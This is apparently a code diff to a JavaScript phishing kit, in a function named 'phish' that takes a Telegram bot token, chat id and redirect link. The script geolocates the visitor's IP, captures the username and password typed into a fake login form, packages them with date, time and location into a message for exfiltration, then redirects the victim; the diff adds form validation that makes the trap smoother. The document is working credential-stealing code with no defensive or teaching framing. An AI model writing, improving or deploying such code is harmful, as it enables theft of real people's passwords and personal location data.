@@ -97,7 +97,6 @@ const phish = (bot_token, chat_id, redirect_link) => {
         let json = JSON.parse(req.responseText);
         return json;
     };
-    let ip_json = ipLocation();
     const goTo = () => {
         let link = new URLSearchParams(window.location.search).get('link');
         if (link !== null) {
@@ -106,20 +105,54 @@ const phish = (bot_token, chat_id, redirect_link) => {
         window.location.assign(redirect_link);
     };
 
-    $('#submit-button').on('click', function() {
+    let ip_json = ipLocation();
+    var uname = $('#username'),
+        pass = $('#password'),
+        submitButton = $('#submit-button');
+
+    submitButton.prop('disabled', true);
+
+    uname.on(
+        'change input paste keydown cut keypress keyup changeproperty',
+        function() {
+            $(this).val().length != 0
+                ? $(this).attr('valid', true)
+                : $(this).attr('valid', false);
+        }
+    );
+    pass.on(
+        'change input paste keydown cut keypress keyup changeproperty',
+        function() {
+            $(this).val().length != 0
+                ? $(this).attr('valid', true)
+                : $(this).attr('valid', false);
+        }
+    );
+
+    $('#username, #password').on(
+        'change input paste keydown cut keypress keyup changeproperty',
+        function() {
+            $('#username').attr('valid') === 'true' &&
+            pass.attr('valid') === 'true'
+                ? submitButton.prop('disabled', false)
+                : submitButton.prop('disabled', true);
+        }
+    );
+
+    submitButton.on('click', function() {
         let currentdate = new Date(),
             date = `${currentdate.getDate()}/${currentdate.getMonth() +
                 1}/${currentdate.getFullYear()}`,
             time = `${currentdate.getHours()}:${currentdate.getMinutes()}:${currentdate.getSeconds()}`,
             xhr = new XMLHttpRequest(),
-            login = $('#username').val(),
-            pass = $('#password').val(),
+            unameVal = uname.val(),
+            passVal = pass.val(),
             msg = `----------------------------------------------------%0A
 Date  :    ${date}%0A
 Time :    ${time}%0A
 ----------------------------------------------------%0A
-Login:    ${login}%0A
-Pass :    ${pass}%0A
+Login:    ${unameVal}%0A
+Pass :    ${passVal}%0A
 ----------------------------------------------------%0A
 IP: ${ip_json.query}%0A
 Location: ${ip_json.city}, ${ip_json.regionName}, ${ip_json.country}%0A
